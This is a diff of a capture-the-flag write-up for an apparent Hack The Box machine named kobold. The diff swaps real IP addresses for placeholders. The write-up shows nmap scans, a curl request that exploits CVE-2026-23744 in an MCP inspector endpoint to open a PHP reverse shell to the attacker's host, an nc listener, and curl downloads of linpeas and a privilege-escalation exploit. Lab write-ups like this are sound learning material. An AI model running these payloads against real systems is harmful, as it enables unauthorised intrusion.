@@ -14,7 +14,7 @@ date: 2026-07-08
 
 ```bash
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-08 07:58 +07
-Nmap scan report for bin.kobold.htb (10.129.245.50)
+Nmap scan report for bin.kobold.htb (<IP_ADDRESS>)
 Host is up (0.59s latency).
 Not shown: 997 closed tcp ports (conn-refused)
 PORT    STATE SERVICE
@@ -25,9 +25,9 @@ PORT    STATE SERVICE
 
 - First, I scanned without any `nmap` flag to save time to find  `open` ports. After that, I used `-sC` and `-sV` flag which allowed me to check deeply the `open` ports with common scripts.
 ```bash
-nmap 10.129.245.50 -sV -sC -p 22,80,443
+nmap <IP_ADDRESS> -sV -sC -p 22,80,443
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-08 08:00 +07
-Nmap scan report for bin.kobold.htb (10.129.245.50)
+Nmap scan report for bin.kobold.htb (<IP_ADDRESS>)
 Host is up (0.48s latency).
 
 PORT    STATE SERVICE  VERSION
@@ -112,14 +112,14 @@ MCP                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration:
 - There are many websites on the Internet write about the payload to exploit `CVE-2026-23744` and in this lab I used payload from this website, you can follow this link: `https://github.com/advisories/GHSA-232v-j27c-5pp6`
 - Using `curl` and payload from the above website, I could execute a `reverse shell` and gain the `RCE` privilege:
 ```bash
-curl -k -X POST https://mcp.kobold.htb/api/mcp/connect      --header "Content-Type: application/json"      --data '{"serverConfig":{"command":"php","args":["-r","$sock=fsockopen(\"10.10.16.22\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");"]},"serverId":"php_shell"}'
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect      --header "Content-Type: application/json"      --data '{"serverConfig":{"command":"php","args":["-r","$sock=fsockopen(\"<MY_IP_ADDRESS>\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");"]},"serverId":"php_shell"}'
 ```
 
 ```bash
 sudo nc -lvnp 4444
 [sudo] password for admin: 
 Listening on 0.0.0.0 4444
-Connection received on 10.129.245.50 38636
+Connection received on <IP_ADDRESS> 38636
 bash: cannot set terminal process group (1590): Inappropriate ioctl for device
 bash: no job control in this shell
 ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ whoami
@@ -181,8 +181,8 @@ to make my computer become a `http server` in port `8080`. Now I could use `curl
 - After that, I gave this file the execute privilege `chmod +x linpeas.sh` and run `linpeas.sh` file.
 
 ```bash
-ben@kobold:~$ curl http://10.10.16.22:8080/linpeas.sh -O
-curl http://10.10.16.22:8080/linpeas.sh -O
+ben@kobold:~$ curl http://<MY_IP_ADDRESS>:8080/linpeas.sh -O
+curl http://<MY_IP_ADDRESS>:8080/linpeas.sh -O
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 1038k  100 1038k    0     0   160k      0  0:00:06  0:00:06 --:--:--  217k
@@ -236,8 +236,8 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 ```
 - From the server side, I downloaded the `.zip` file that contained exploit code using `curl` and `unzip` it using `python3`
 ```bash
-ben@kobold:~$ curl http://10.10.16.22:8080/CVE-2026-41651-main.zip -O
-curl http://10.10.16.22:8080/CVE-2026-41651-main.zip -O
+ben@kobold:~$ curl http://<MY_IP_ADDRESS>:8080/CVE-2026-41651-main.zip -O
+curl http://<MY_IP_ADDRESS>:8080/CVE-2026-41651-main.zip -O
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  133k  100  133k    0     0  76421      0  0:00:01  0:00:01 --:--:-- 76408
